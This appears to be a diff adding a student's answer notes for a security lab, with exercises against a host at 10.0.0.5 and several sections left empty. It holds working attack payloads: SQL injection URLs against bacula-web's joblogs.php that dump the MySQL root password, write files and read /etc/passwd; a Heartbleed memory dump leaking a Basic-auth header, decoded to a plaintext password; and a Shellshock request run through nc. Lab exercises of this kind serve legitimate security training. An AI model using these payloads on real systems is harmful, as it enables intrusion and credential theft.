@@ -1,0 +1,55 @@
+==== EXERCICE 1 ====
+* Possible exploitations:
+  * mysql's root password:
+    * http://10.0.0.5/bacula-web/joblogs.php?jobid=-1' UNION SELECT NULL,NULL,User,password, FROM mysql.user WHERE User='root
+  * Write file :
+    * INTO OUTFILE
+http://10.0.0.5/bacula-web/joblogs.php?jobid=0' union select "hello",2,3,4 INTO OUTFILE '/tmp/myfile'%23
+
+  * Read file
+    *    LOAD_FILE('/etc/passwd') 
+    * http://10.0.0.5/bacula-web/joblogs.php?jobid=0%27%20union%20select%201,2,LOAD_FILE(%27/etc/passwd%27),2%23
+
+
+==== EXERCICE 2 ====
+* python ./hb-test.py 10.0.0.5
+* info disclosure (basic creds)
+---
+  3e40: 65 55 4A 70 61 57 6C 6E 55 47 46 7A 63 33 63 77  eUJpaWlnUGFzc3cw
+  3e50: 63 6D 51 3D 55 73 65 72 2D 41 67 65 6E 74 3A 20  cmQ=User-Agent: 
+  3e60: 63 75 72 6C 2F 37 2E 33 37 2E 31 48 6F 73 74 3A  curl/7.37.1Host:
+  3e70: 20 31 30 2E 30 2E 30 2E 35 41 63 63 65 70 74 3A   10.0.0.5Accept:
+  3e80: 20 2A 2F 2A 47 45 54 20 2F 70 72 6F 74 65 63 74   */*GET /protect
+  3e90: 65 64 2F 77 69 6E 20 48 54 54 50 2F 31 2E 31 41  ed/win HTTP/1.1A
+  3ea0: 75 74 68 6F 72 69 7A 61 74 69 6F 6E 3A 20 42 61  uthorization: Ba
+  3eb0: 73 69 63 20 61 6D 39 6F 62 6A 70 4E 65 55 4A 70  sic am9objpNeUJp
+  3ec0: 61 57 6C 6E 55 47 46 7A 63 33 63 77 63 6D 51 3D  aWlnUGFzc3cwcmQ=
+  3ed0: 55 73 65 72 2D 41 67 65 6E 74 3A 20 63 75 72 6C  User-Agent: curl
+---
+* B64 decode:
+---
+$ echo "am9objpNeUJpaWlnUGFzc3cwcmQ=" | base64 -d
+john:MyBiiigPassw0rd
+---
+
+
+==== EXERCICE 3 ====
+* Test the vulnerability
+---
+$ nc 10.0.0.5 80
+GET /cgi-bin/index.php HTTP/1.0
+host: 10.0.0.5
+User-Agent: () { :; }; echo; echo; echo Vuln; /bin/uname -a;
+X-FWD: blabla
+---
+
+
+
+==== EXERCICE 4 ====
+
+
+==== EXERCICE 5 ====
+
+
+
+==== EXERCICE 6 ====
